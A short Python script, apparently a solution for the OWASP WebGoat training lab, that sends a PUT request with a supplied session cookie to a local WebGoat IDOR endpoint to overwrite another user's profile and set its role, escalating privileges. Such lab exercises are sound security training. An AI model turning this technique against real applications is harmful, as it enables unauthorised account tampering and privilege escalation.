##################################################
## Python script for updating user profile data via PUT request after escalating privileges to admin
##################################################
## Author: Micah Wieburg
## License: MIT License
## Copyright: Copyright (c) 2024 mwieburg
## Project: OWASP Webgoat

import requests
import sys

try:
   #Assign script parameters to variables
   userprofile = str(sys.argv[1])
   sessionID = sys.argv[2]
   role = sys.argv[3]
   #Create request body with user profile details
   body = {
	   'role':role,
           'color':'red',
	   'size':'large',
	   'name':'Buffalo Bill',
	   'userId':userprofile
     }
   #Define request headers
   headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/json; charset=UTF-8',
		 'Cookie':'JSESSIONID='+str(sessionID),
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
      }
   #Send put request to update user profile
   response = requests.put('http://localhost:8080/WebGoat/IDOR/profile/'+str(userprofile),json=body,timeout=5, headers=headers)
   data = response.json()
   print(data)

except Exception as error:
  print("An exception occured:", error)
